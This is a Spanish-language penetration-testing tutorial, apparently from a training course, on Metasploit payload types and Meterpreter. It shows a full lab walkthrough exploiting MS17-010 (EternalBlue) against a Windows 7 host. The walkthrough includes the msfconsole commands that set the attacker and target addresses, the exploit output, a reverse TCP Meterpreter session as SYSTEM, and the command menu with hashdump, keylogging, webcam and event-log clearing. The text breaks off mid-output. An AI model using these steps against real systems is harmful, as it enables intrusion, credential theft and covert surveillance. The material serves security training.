Un `Payload` en Metasploit se refiere a un módulo que ayuda al módulo de exploit a (típicamente) devolver un shell al atacante. Los payloads se envían junto con el exploit en sí para eludir los procedimientos de funcionamiento estándar del servicio vulnerable (`exploits job`) y luego se ejecutan en el sistema operativo objetivo para, generalmente, devolver una conexión inversa al atacante y establecer un punto de apoyo (`payload's job`).

Hay tres tipos diferentes de módulos de payload en el Metasploit Framework: Singles, Stagers y Stages. Utilizar las tres tipologías de interacción de payload resultará beneficioso para el pentester. Puede ofrecer la flexibilidad que necesitamos para realizar ciertos tipos de tareas. Si un payload está staged o no está representado por `/` en el nombre del payload.

Por ejemplo, `windows/shell_bind_tcp` es un payload single sin stage, mientras que `windows/shell/bind_tcp` consiste en un stager (`bind_tcp`) y un stage (`shell`).

### Singles

Un payload `Single` contiene el exploit y todo el shellcode para la tarea seleccionada. Los payloads inline son por diseño más estables que sus contrapartes porque contienen todo en uno. Sin embargo, algunos exploits no soportarán el tamaño resultante de estos payloads ya que pueden volverse bastante grandes. Los `Singles` son payloads autónomos. Son el único objeto enviado y ejecutado en el sistema objetivo, obteniendo un resultado inmediatamente después de ejecutarse. Un payload Single puede ser tan simple como agregar un usuario al sistema objetivo o iniciar un proceso.

### Stagers

Los payloads `Stager` trabajan con los payloads Stage para realizar una tarea específica. Un Stager está esperando en la máquina del atacante, listo para establecer una conexión con el host víctima una vez que el stage complete su ejecución en el host remoto. Los `Stagers` se utilizan típicamente para configurar una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y confiables. Metasploit utilizará el mejor disponible y recurrirá a uno menos preferido cuando sea necesario.

Windows NX vs. NO-NX Stagers

- Problema de fiabilidad para CPUs NX y DEP
- Los stagers NX son más grandes (memoria VirtualAlloc)
- El predeterminado ahora es NX + compatible con Win7

### Stages

Los `Stages` son componentes del payload que son descargados por los módulos stager. Los diversos payload stages proporcionan características avanzadas sin límites de tamaño, como Meterpreter, VNC Injection y otros. Los stages de payload utilizan automáticamente stagers intermedios:

- Un solo `recv()` falla con payloads grandes
- El Stager recibe el stager intermedio
- El stager intermedio luego realiza una descarga completa
- También es mejor para RWX

---
## Staged Payloads

Un payload staged es, simplemente, un `exploitation process` que está modularizado y funcionalmente separado para ayudar a segregar las diferentes funciones que realiza en diferentes bloques de código, cada uno completando su objetivo individualmente pero trabajando en cadena el ataque. Esto finalmente otorgará al atacante acceso remoto a la máquina objetivo si todas las stages funcionan correctamente.

El alcance de este payload, como con cualquier otro, además de otorgar acceso a shell al sistema objetivo, es ser lo más compacto e inconspicuo posible para ayudar con la evasión de Antivirus (`AV`) / Intrusion Prevention System (`IPS`) tanto como sea posible.

`Stage0` de un payload staged representa el shellcode inicial enviado a través de la red al servicio vulnerable de la máquina objetivo, que tiene el único propósito de iniciar una conexión de regreso a la máquina del atacante. Esto es lo que se conoce como una conexión inversa. Como usuario de Metasploit, encontraremos estos bajo los nombres comunes `reverse_tcp`, `reverse_https` y `bind_tcp`. Por ejemplo, bajo el comando `show payloads`, puedes buscar los payloads que se parecen a los siguientes:

### MSF - Staged Payloads

```r
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

Las conexiones inversas tienen menos probabilidades de activar sistemas de prevención ya que quien inicializa la conexión es el host víctima, que la mayoría de las veces reside en lo que se conoce como una `security trust zone`. Sin embargo, por supuesto, esta política de confianza no es seguida ciegamente por los dispositivos de seguridad y el personal de una red, por lo que el atacante debe proceder con cautela incluso con este paso.

El código de Stage0 también tiene como objetivo leer un payload subsiguiente más grande en la memoria una vez que llega. Después de que se establece el canal de comunicación estable entre el atacante y la víctima, la máquina del atacante probablemente enviará un payload stage aún más grande que debería otorgarles acceso a shell. Este payload más grande sería el `Stage1`. Entraremos en más detalles en las secciones posteriores.

### Meterpreter Payload

El `Meterpreter` payload es un tipo específico de payload multifacético que utiliza `DLL injection` para garantizar que la conexión con el host víctima sea estable, difícil de detectar mediante controles simples y persistente a través de reinicios o cambios en el sistema. Meterpreter reside completamente en la memoria del host remoto y no deja rastros en el disco duro, lo que lo hace muy difícil de detectar con técnicas forenses convencionales. Además, los scripts y plugins pueden ser `loaded and unloaded` dinámicamente según sea necesario.

Una vez que se ejecuta el payload de Meterpreter, se crea una nueva sesión que genera la interfaz de Meterpreter. Es muy similar a la interfaz de msfconsole, pero todos los comandos disponibles están dirigidos al sistema objetivo, que el payload ha "infectado". Nos ofrece una gran cantidad de comandos útiles, que varían desde captura de pulsaciones de teclas, recopilación de hashes de contraseñas, grabación de micrófono y captura de pantalla hasta la suplantación de tokens de seguridad de procesos. Profundizaremos más en detalle sobre Meterpreter en una sección posterior.

Utilizando Meterpreter, también podemos `load` diferentes Plugins para ayudarnos con nuestra evaluación. Hablaremos más sobre estos en la sección de Plugins de este módulo.

---
## Searching for Payloads

Para seleccionar nuestro primer payload, necesitamos saber qué queremos hacer en la máquina objetivo. Por ejemplo, si buscamos persistencia de acceso, probablemente querremos seleccionar un payload de Meterpreter.

Como se mencionó anteriormente, los payloads de Meterpreter nos ofrecen una cantidad significativa de flexibilidad. Su funcionalidad base ya es vasta e influyente. Podemos automatizar y entregar rápidamente combinados con plugins como [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) partes del pentest mientras mantenemos una evaluación organizada y eficiente en tiempo. Para ver todos los payloads disponibles, use el comando `show payloads` en `msfconsole`.

### MSF - List Payloads

```r
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual 

 No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
   
<SNIP>
   
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

Como se ve arriba, hay muchos payloads disponibles para elegir. No solo eso, sino que podemos crear nuestros propios payloads utilizando `msfvenom`, pero profundizaremos en eso un poco más tarde. Usaremos el mismo objetivo que antes, y en lugar de usar el payload predeterminado, que es un simple `reverse_tcp_shell`, usaremos un `Meterpreter Payload for Windows 7(x64)`.

Desplazándonos por la lista anterior, encontramos la sección que contiene `Meterpreter Payloads for Windows(x64)`.

```r
   515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
```

Como podemos ver, puede llevar bastante tiempo encontrar el payload deseado con una lista tan extensa. También podemos usar `grep` en `msfconsole` para filtrar términos específicos. Esto acelerará la búsqueda y, por lo tanto, nuestra selección.

Debemos ingresar el comando `grep` con el parámetro correspondiente al principio y luego el comando en el que debe ocurrir el filtrado. Por ejemplo, supongamos que queremos tener un `TCP` basado en `reverse shell` manejado por `Meterpreter` para nuestro exploit. En consecuencia, primero podemos buscar todos los resultados que contengan la palabra `Meterpreter` en los payloads.

### MSF - Searching for Specific Payload

```r
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter

/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

Esto nos da un total de `14` resultados. Ahora podemos agregar otro comando `grep` después del primero y buscar `reverse_tcp`.

```r
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

Con la ayuda de `grep`, reducimos la lista de payloads que queríamos a menos. Por supuesto, el comando `grep` se puede usar para todos los demás comandos. Todo lo que necesitamos saber es lo que estamos buscando.

---
## Selecting Payloads

Al igual que con el módulo, necesitamos el número de índice de la entrada que nos gustaría usar. Para configurar el payload para el módulo seleccionado actualmente, usamos `set payload <no.>` solo después de seleccionar un módulo de exploit para empezar.

### MSF - Select Payload

```r
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

Después de seleccionar un payload, tendremos más opciones disponibles para nosotros.

```r
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

Como podemos ver, al ejecutar el comando `show payloads` dentro del módulo de exploit en sí, msfconsole ha detectado que el target es una máquina Windows, y por lo tanto solo mostró los payloads dirigidos a sistemas operativos Windows.

También podemos ver que ha aparecido un nuevo campo de opciones, directamente relacionado con lo que contendrán los parámetros del payload. Nos centraremos en `LHOST` y `LPORT` (nuestra IP del atacante y el puerto deseado para la inicialización de la conexión inversa). Por supuesto, si el ataque falla, siempre podemos usar un puerto diferente y relanzar el ataque.

---
## Using Payloads

Es hora de configurar nuestros parámetros tanto para el módulo de exploit como para el módulo de payload. Para la parte de exploit, necesitaremos configurar lo siguiente:

|**Parameter**|**Description**|
|---|---|
|`RHOSTS`|La dirección IP del host remoto, la máquina objetivo.|
|`RPORT`|No requiere un cambio, solo una verificación de que estamos en el puerto 445, donde SMB está ejecutándose.|

Para la parte del payload, necesitaremos configurar lo siguiente:

|**Parameter**|**Description**|
|---|---|
|`LHOST`|La dirección IP del host, la máquina del atacante.|
|`LPORT`|No requiere un cambio, solo una verificación de que el puerto no está ya en uso.|

Si queremos verificar rápidamente la dirección IP de nuestro LHOST, siempre podemos usar el comando `ifconfig` directamente desde el menú de msfconsole.

### MSF - Exploit and Payload Configuration

```r
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

Luego, podemos ejecutar el exploit y ver qué devuelve. Observa las diferencias en la salida a continuación:

```r
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0

x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > whoami

[-] Unknown command: whoami.


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

El prompt no es uno de línea de comandos de Windows sino uno de `Meterpreter`. El comando `whoami`, típicamente usado para Windows, no funciona aquí. En su lugar, podemos usar el equivalente de Linux `getuid`. Explorar el menú de `help` nos da más información sobre lo que los payloads de Meterpreter son capaces de hacer.

### MSF - Meterpreter Commands

```r
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    LCD           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    PWD           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Strap: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    get proxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of hostnames on the target
    route         View and modify the routing table


Strap: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Strap: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idle time       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real-time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Strap: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    get system     Attempt to elevate your privilege to that of the local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestamp Commands
========================

    Command       Description
    -------       -----------
    timestamp     Manipulate file MACE attributes
```

Bastante impresionante. Desde extraer hashes de usuario del SAM hasta tomar capturas de pantalla y activar webcams. Todo esto se hace desde la comodidad de una línea de comandos estilo Linux. Explorando más, también vemos la opción de abrir un canal shell. Esto nos colocará en la interfaz de línea de comandos real de Windows.

### MSF - Meterpreter Navigation

```r
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   

 2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris


meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

`Channel 1` ha sido creado, y automáticamente nos colocamos en la CLI para esta máquina. El canal aquí representa la conexión entre nuestro dispositivo y el host objetivo, que se ha establecido en una conexión TCP inversa (desde el host objetivo hacia nosotros) utilizando un Meterpreter Stager y Stage. El stager se activó en nuestra máquina para esperar una solicitud de conexión iniciada por el payload Stage en la máquina objetivo.

Moverse a un shell estándar en el objetivo es útil en algunos casos, pero Meterpreter también puede navegar y realizar acciones en la máquina víctima. Así que vemos que los comandos han cambiado, pero tenemos el mismo nivel de privilegio dentro del sistema.

### MSF - Windows CMD

```r
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
